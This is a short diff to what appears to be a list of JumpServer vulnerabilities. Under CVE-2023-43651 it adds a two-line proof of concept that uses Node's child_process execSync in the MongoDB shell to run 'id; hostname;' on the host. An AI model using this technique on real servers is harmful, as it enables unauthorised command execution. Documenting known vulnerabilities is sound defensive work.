@@ -12,8 +12,10 @@ Affected versions
 
 ### [CVE-2023-43651] RCE on the host system via MongoDB shell
 https://github.com/jumpserver/jumpserver/security/advisories/GHSA-4r5x-x283-wm96
-
-
+```
+admin> const { execSync } = require("child_process")
+admin> console.log(execSync("id; hostname;").toString())
+```
 Affected versions
 ```
 v2.0.0-v2.28.19,
